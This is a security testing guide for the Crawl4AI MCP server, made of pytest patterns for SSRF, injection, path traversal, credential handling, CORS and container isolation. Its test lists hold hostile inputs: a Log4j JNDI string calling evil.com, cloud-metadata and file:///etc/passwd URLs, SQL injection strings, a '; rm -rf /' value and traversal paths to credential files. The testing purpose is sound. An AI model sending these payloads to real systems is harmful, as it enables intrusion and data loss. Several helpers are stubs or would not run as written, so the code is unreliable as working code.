# Security Testing Patterns for Crawl4AI MCP

This document provides comprehensive security testing patterns for the Crawl4AI MCP project, covering authentication, input validation, credential management, OWASP compliance, and MCP-specific security considerations.

## Table of Contents

1. [Overview](#overview)
2. [Authentication & Authorization Testing](#authentication--authorization-testing)
3. [Input Validation & Sanitization](#input-validation--sanitization)
4. [Credential Management Testing](#credential-management-testing)
5. [OWASP Top 10 Compliance](#owasp-top-10-compliance)
6. [MCP-Specific Security](#mcp-specific-security)
7. [Docker Container Security](#docker-container-security)
8. [API Security Testing](#api-security-testing)
9. [Test Implementation Examples](#test-implementation-examples)

## Overview

The Crawl4AI MCP server handles sensitive operations including:

- API key management (OpenAI, Qdrant, Supabase)
- Database connections (Neo4j, Qdrant, Supabase)
- Web crawling with external URL access
- Docker container orchestration
- Search engine integration

### Security Testing Principles

1. **Defense in Depth**: Test multiple security layers
2. **Least Privilege**: Verify minimal necessary permissions
3. **Input Validation**: Never trust external input
4. **Fail Securely**: Ensure graceful failure without information leakage
5. **Audit Trail**: Verify logging without exposing sensitive data

## Authentication & Authorization Testing

### API Key Security Patterns

```python
# Pattern: Test API key validation
def test_api_key_validation():
    """Test that invalid API keys are rejected"""
    invalid_keys = [
        "",  # Empty key
        " ",  # Whitespace only
        "invalid-key",  # Invalid format
        "sk_test_" + "x" * 100,  # Too long
        "sk_test_<script>alert(1)</script>",  # XSS attempt
    ]
    
    for key in invalid_keys:
        # Test should verify rejection without exposing key details
        with pytest.raises(AuthenticationError) as exc:
            validate_api_key(key)
        assert "invalid" in str(exc.value).lower()
        assert key not in str(exc.value)  # Don't leak the key

# Pattern: Test API key exposure prevention
def test_api_key_not_exposed_in_logs():
    """Ensure API keys are never exposed in logs or error messages"""
    with capture_logs() as logs:
        try:
            connect_with_api_key("sk_test_secret123")
        except Exception:
            pass
    
    log_content = "\n".join(logs)
    assert "sk_test_secret123" not in log_content
    assert "***" in log_content or "[REDACTED]" in log_content
```

### Authorization Testing Patterns

```python
# Pattern: Test authorization boundaries
def test_authorization_boundaries():
    """Test that users can only access their authorized resources"""
    # Create resources with different owners
    resource_a = create_resource(owner="user_a")
    resource_b = create_resource(owner="user_b")
    
    # Test user_a cannot access user_b's resources
    with authenticated_as("user_a"):
        assert can_access(resource_a) is True
        assert can_access(resource_b) is False
        
        with pytest.raises(ForbiddenError):
            access_resource(resource_b)
```

## Input Validation & Sanitization

### URL Validation Patterns

```python
# Pattern: Test URL validation and SSRF prevention
def test_url_validation_ssrf_prevention():
    """Test that internal URLs and SSRF attempts are blocked"""
    dangerous_urls = [
        # Internal network access attempts
        "http://localhost/admin",
        "http://127.0.0.1:8080",
        "http://169.254.169.254/",  # AWS metadata
        "http://[::1]/",  # IPv6 localhost
        "http://0.0.0.0/",
        
        # Protocol manipulation
        "file:///etc/passwd",
        "gopher://localhost",
        "dict://localhost",
        
        # DNS rebinding attempts
        "http://1.1.1.1.xip.io",
        
        # Redirect chains
        "http://evil.com/redirect?to=http://localhost",
    ]
    
    for url in dangerous_urls:
        with pytest.raises(ValidationError) as exc:
            validate_crawl_url(url)
        assert "invalid" in str(exc.value).lower()
        assert "security" in str(exc.value).lower()

# Pattern: Test query injection prevention
def test_query_injection_prevention():
    """Test that malicious queries are sanitized"""
    malicious_queries = [
        "'; DROP TABLE users; --",
        "\" OR 1=1 --",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",  # Log4j pattern
        "{{7*7}}",  # Template injection
        "%0d%0aContent-Length:%200",  # Header injection
    ]
    
    for query in malicious_queries:
        sanitized = sanitize_search_query(query)
        # Verify dangerous patterns are removed/escaped
        assert "DROP TABLE" not in sanitized
        assert "<script>" not in sanitized
        assert "${jndi:" not in sanitized
```

### File Path Validation

```python
# Pattern: Test path traversal prevention
def test_path_traversal_prevention():
    """Test that path traversal attempts are blocked"""
    dangerous_paths = [
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM",
        "../../../../proc/self/environ",
        "./uploads/../../../etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
    ]
    
    for path in dangerous_paths:
        with pytest.raises(SecurityError):
            validate_file_path(path)
```

## Credential Management Testing

### Environment Variable Security

```python
# Pattern: Test secure credential loading
def test_secure_credential_loading():
    """Test that credentials are loaded securely from environment"""
    # Test missing required credentials
    with mock.patch.dict(os.environ, {}, clear=True):
        with pytest.raises(ConfigurationError) as exc:
            load_credentials()
        assert "OPENAI_API_KEY" in str(exc.value)
    
    # Test credential format validation
    with mock.patch.dict(os.environ, {"OPENAI_API_KEY": "invalid"}):
        with pytest.raises(ValidationError):
            load_credentials()

# Pattern: Test credential rotation
def test_credential_rotation():
    """Test that credential rotation is handled gracefully"""
    old_key = "sk_old_key_123"
    new_key = "sk_new_key_456"
    
    # Start with old key
    with mock.patch.dict(os.environ, {"API_KEY": old_key}):
        client = create_client()
        assert client.test_connection() is True
    
    # Rotate to new key
    with mock.patch.dict(os.environ, {"API_KEY": new_key}):
        client.reload_credentials()
        assert client.test_connection() is True
```

### Database Connection Security

```python
# Pattern: Test secure database connections
def test_secure_database_connections():
    """Test that database connections use secure practices"""
    # Test SQL injection prevention
    malicious_inputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
    ]
    
    for input_val in malicious_inputs:
        # Parameterized queries should prevent injection
        result = db.execute_query(
            "SELECT * FROM data WHERE id = ?",
            params=[input_val]
        )
        # Query should execute safely without injection
        assert isinstance(result, QueryResult)

# Pattern: Test connection encryption
def test_database_connection_encryption():
    """Test that database connections use encryption"""
    conn_string = get_database_connection_string()
    
    # Neo4j should use bolt+s or neo4j+s for encryption
    if "neo4j" in conn_string:
        assert "bolt+s://" in conn_string or "neo4j+s://" in conn_string
    
    # PostgreSQL should use SSL
    if "postgresql" in conn_string:
        assert "sslmode=require" in conn_string
```

## OWASP Top 10 Compliance

### A01:2021 – Broken Access Control

```python
# Pattern: Test access control enforcement
def test_access_control_enforcement():
    """Test that access controls are properly enforced"""
    # Test unauthorized access to admin functions
    with authenticated_as("regular_user"):
        admin_tools = [
            "parse_github_repository",
            "query_knowledge_graph",
        ]
        
        for tool in admin_tools:
            with pytest.raises(ForbiddenError):
                execute_mcp_tool(tool, {})
```

### A02:2021 – Cryptographic Failures

```python
# Pattern: Test encryption of sensitive data
def test_sensitive_data_encryption():
    """Test that sensitive data is encrypted at rest and in transit"""
    # Test API keys are encrypted in storage
    stored_key = store_api_key("sk_test_123")
    raw_storage = get_raw_storage_value(stored_key.id)
    
    assert "sk_test_123" not in raw_storage
    assert is_encrypted(raw_storage)
    
    # Test decryption works correctly
    decrypted = decrypt_api_key(stored_key.id)
    assert decrypted == "sk_test_123"
```

### A03:2021 – Injection

```python
# Pattern: Test comprehensive injection prevention
def test_injection_prevention():
    """Test prevention of various injection attacks"""
    # Neo4j Cypher injection
    malicious_cypher = "MATCH (n) DETACH DELETE n"
    safe_result = execute_cypher_query(
        "MATCH (n:Node {id: $id}) RETURN n",
        params={"id": malicious_cypher}
    )
    assert safe_result is not None  # Query executed safely
    
    # Command injection
    malicious_cmd = "; rm -rf /"
    with pytest.raises(SecurityError):
        execute_system_command(f"echo {malicious_cmd}")
```

### A04:2021 – Insecure Design

```python
# Pattern: Test security by design principles
def test_security_by_design():
    """Test that security is built into the design"""
    # Test rate limiting
    for i in range(100):
        response = make_request("/api/search", {"q": "test"})
        if i > 50:  # After threshold
            assert response.status_code == 429  # Too Many Requests
    
    # Test default deny
    response = make_request("/api/unknown_endpoint")
    assert response.status_code == 404
    assert "error" not in response.text.lower()  # No stack traces
```

### A05:2021 – Security Misconfiguration

```python
# Pattern: Test secure configuration
def test_secure_configuration():
    """Test that security configurations are properly set"""
    # Test debug mode is disabled in production
    assert os.getenv("DEBUG", "false").lower() != "true"
    
    # Test secure headers
    response = make_request("/")
    security_headers = {
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
        "X-XSS-Protection": "1; mode=block",
        "Strict-Transport-Security": "max-age=31536000",
    }
    
    for header, value in security_headers.items():
        assert response.headers.get(header) == value
```

## MCP-Specific Security

### MCP Tool Security Patterns

```python
# Pattern: Test MCP tool input validation
def test_mcp_tool_input_validation():
    """Test that MCP tools validate inputs properly"""
    # Test URL validation in crawl tools
    invalid_inputs = [
        {"url": "javascript:alert(1)"},
        {"url": "data:text/html,<script>alert(1)</script>"},
        {"url": None},
        {"url": ["http://example.com"]},  # Wrong type
    ]
    
    for input_data in invalid_inputs:
        with pytest.raises(ValidationError):
            await mcp_tool_crawl(input_data)

# Pattern: Test MCP tool authorization
def test_mcp_tool_authorization():
    """Test that MCP tools check authorization"""
    # Mock an unauthorized context
    ctx = create_mock_context(authorized=False)
    
    protected_tools = [
        "parse_github_repository",
        "check_ai_script_hallucinations",
    ]
    
    for tool in protected_tools:
        with pytest.raises(UnauthorizedError):
            await execute_tool(ctx, tool, {})
```

### MCP Transport Security

```python
# Pattern: Test secure MCP transport
def test_mcp_transport_security():
    """Test that MCP transport is secure"""
    # Test HTTPS enforcement for HTTP transport
    if os.getenv("TRANSPORT") == "http":
        response = make_request("http://localhost:8051/", allow_redirects=False)
        assert response.status_code == 301  # Redirect to HTTPS
        assert response.headers["Location"].startswith("https://")
    
    # Test WebSocket security for SSE transport
    if os.getenv("TRANSPORT") == "sse":
        # Test that WebSocket connections require authentication
        with pytest.raises(ConnectionError):
            connect_websocket("ws://localhost:8051/events", auth=None)
```

## Docker Container Security

### Container Isolation Testing

```python
# Pattern: Test container isolation
def test_container_isolation():
    """Test that containers are properly isolated"""
    # Test that containers run as non-root
    result = docker_exec("mcp-crawl4ai", "id -u")
    assert result.strip() != "0"  # Not running as root
    
    # Test capability restrictions
    result = docker_exec("mcp-crawl4ai", "capsh --print")
    dangerous_caps = ["CAP_SYS_ADMIN", "CAP_NET_ADMIN", "CAP_SYS_PTRACE"]
    for cap in dangerous_caps:
        assert cap not in result

# Pattern: Test resource limits
def test_container_resource_limits():
    """Test that containers have resource limits"""
    compose_config = load_docker_compose()
    
    for service in ["mcp-crawl4ai", "qdrant", "neo4j"]:
        limits = compose_config["services"][service]["deploy"]["resources"]["limits"]
        assert "memory" in limits
        assert "cpus" in limits
        
        # Verify limits are reasonable
        assert parse_memory(limits["memory"]) <= parse_memory("8G")
        assert float(limits["cpus"]) <= 4
```

### Network Security

```python
# Pattern: Test network isolation
def test_network_isolation():
    """Test that services are properly network isolated"""
    # Test that internal services aren't exposed
    internal_services = [
        ("valkey", 6379),
        ("neo4j", 7687),  # Should only expose 7474 for browser
    ]
    
    for service, port in internal_services:
        # Should not be accessible from host
        with pytest.raises(ConnectionError):
            socket.create_connection(("localhost", port), timeout=1)

# Pattern: Test secure inter-container communication
def test_secure_container_communication():
    """Test that containers communicate securely"""
    # Test that services use internal hostnames
    env_vars = get_container_env("mcp-crawl4ai")
    
    assert "qdrant:6333" in env_vars.get("QDRANT_URL", "")
    assert "neo4j:7687" in env_vars.get("NEO4J_URI", "")
    assert "searxng:8080" in env_vars.get("SEARXNG_URL", "")
    
    # Should not use localhost or external IPs
    assert "localhost" not in env_vars.get("QDRANT_URL", "")
    assert "0.0.0.0" not in env_vars.get("QDRANT_URL", "")
```

## API Security Testing

### Rate Limiting

```python
# Pattern: Test rate limiting
def test_api_rate_limiting():
    """Test that API endpoints have rate limiting"""
    endpoint = "/api/search"
    
    # Make rapid requests
    responses = []
    for _ in range(100):
        responses.append(make_request(endpoint, {"q": "test"}))
    
    # Should see rate limiting kick in
    status_codes = [r.status_code for r in responses]
    assert 429 in status_codes  # Too Many Requests
    
    # Check rate limit headers
    limited_response = next(r for r in responses if r.status_code == 429)
    assert "X-RateLimit-Limit" in limited_response.headers
    assert "X-RateLimit-Remaining" in limited_response.headers
    assert "X-RateLimit-Reset" in limited_response.headers
```

### CORS Security

```python
# Pattern: Test CORS configuration
def test_cors_security():
    """Test that CORS is properly configured"""
    # Test preflight requests
    response = make_request(
        "/api/search",
        method="OPTIONS",
        headers={
            "Origin": "https://evil.com",
            "Access-Control-Request-Method": "POST",
        }
    )
    
    # Should not allow arbitrary origins
    assert response.headers.get("Access-Control-Allow-Origin") != "*"
    assert response.headers.get("Access-Control-Allow-Origin") != "https://evil.com"
    
    # Should only allow specific origins
    allowed_origins = ["https://app.example.com", "http://localhost:3000"]
    actual_origin = response.headers.get("Access-Control-Allow-Origin")
    if actual_origin:
        assert actual_origin in allowed_origins
```

### API Authentication

```python
# Pattern: Test API authentication
def test_api_authentication():
    """Test that API endpoints require authentication"""
    protected_endpoints = [
        "/api/crawl",
        "/api/search",
        "/api/parse_repository",
    ]
    
    for endpoint in protected_endpoints:
        # Test without auth
        response = make_request(endpoint, method="POST")
        assert response.status_code == 401  # Unauthorized
        
        # Test with invalid auth
        response = make_request(
            endpoint,
            method="POST",
            headers={"Authorization": "Bearer invalid_token"}
        )
        assert response.status_code == 401
        
        # Test with valid auth
        response = make_request(
            endpoint,
            method="POST",
            headers={"Authorization": f"Bearer {get_valid_token()}"}
        )
        assert response.status_code != 401
```

## Test Implementation Examples

### Security Test Helpers

```python
# tests/security/security_test_helpers.py
import os
import socket
import asyncio
from typing import Dict, Any, List
from unittest.mock import patch, MagicMock
import pytest
import docker
import yaml

class SecurityTestContext:
    """Context manager for security testing"""
    
    def __init__(self):
        self.docker_client = docker.from_env()
        self.original_env = {}
    
    def __enter__(self):
        # Backup environment
        self.original_env = dict(os.environ)
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        # Restore environment
        os.environ.clear()
        os.environ.update(self.original_env)
    
    def set_insecure_env(self):
        """Set up an insecure environment for testing"""
        os.environ.update({
            "DEBUG": "true",
            "OPENAI_API_KEY": "sk_test_insecure",
            "NEO4J_PASSWORD": "password123",
            "QDRANT_API_KEY": "",
        })
    
    def get_container_env(self, container_name: str) -> Dict[str, str]:
        """Get environment variables from a running container"""
        try:
            container = self.docker_client.containers.get(container_name)
            env_list = container.attrs["Config"]["Env"]
            return dict(e.split("=", 1) for e in env_list)
        except docker.errors.NotFound:
            return {}
    
    def docker_exec(self, container_name: str, command: str) -> str:
        """Execute command in container"""
        container = self.docker_client.containers.get(container_name)
        exit_code, output = container.exec_run(command)
        return output.decode("utf-8")

def capture_logs():
    """Context manager to capture logs for security analysis"""
    import logging
    from io import StringIO
    
    log_capture = StringIO()
    handler = logging.StreamHandler(log_capture)
    handler.setLevel(logging.DEBUG)
    
    # Add handler to all loggers
    loggers = [logging.getLogger(name) for name in logging.root.manager.loggerDict]
    loggers.append(logging.getLogger())
    
    for logger in loggers:
        logger.addHandler(handler)
    
    try:
        yield log_capture.getvalue().splitlines
    finally:
        for logger in loggers:
            logger.removeHandler(handler)

def make_request(endpoint: str, data: Dict[str, Any] = None, **kwargs) -> MagicMock:
    """Make HTTP request for testing"""
    # This would be implemented with actual HTTP client
    response = MagicMock()
    response.status_code = 200
    response.headers = {}
    response.text = "{}"
    return response

async def execute_mcp_tool(tool_name: str, params: Dict[str, Any], ctx=None):
    """Execute MCP tool for testing"""
    # This would call actual MCP tool implementation
    pass

def parse_memory(memory_str: str) -> int:
    """Parse memory string like '4G' to bytes"""
    units = {"K": 1024, "M": 1024**2, "G": 1024**3}
    if memory_str[-1] in units:
        return int(memory_str[:-1]) * units[memory_str[-1]]
    return int(memory_str)
```

### Running Security Tests

```bash
# Run all security tests
pytest tests/security/ -v

# Run specific security test category
pytest tests/security/test_security_patterns.py::test_authentication -v

# Run with security coverage report
pytest tests/security/ --cov=src --cov-report=html

# Run with security markers
pytest -m "security and not slow" -v
```

## Security Testing Checklist

- [ ] **Authentication & Authorization**
  - [ ] API key validation
  - [ ] Credential rotation
  - [ ] Authorization boundaries
  - [ ] Session management

- [ ] **Input Validation**
  - [ ] URL validation (SSRF prevention)
  - [ ] Query sanitization (injection prevention)
  - [ ] File path validation (traversal prevention)
  - [ ] Type checking and bounds validation

- [ ] **Credential Management**
  - [ ] Environment variable security
  - [ ] Secure storage
  - [ ] No hardcoded credentials
  - [ ] Credential rotation support

- [ ] **OWASP Compliance**
  - [ ] Access control testing
  - [ ] Cryptographic implementation
  - [ ] Injection prevention
  - [ ] Security misconfiguration checks

- [ ] **Container Security**
  - [ ] Non-root execution
  - [ ] Resource limits
  - [ ] Network isolation
  - [ ] Capability restrictions

- [ ] **API Security**
  - [ ] Rate limiting
  - [ ] CORS configuration
  - [ ] Authentication requirements
  - [ ] Error handling (no info leakage)

## References

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Docker Security Best Practices](https://docs.docker.com/develop/security-best-practices/)
- [MCP Security Considerations](https://modelcontextprotocol.io/docs/concepts/security)
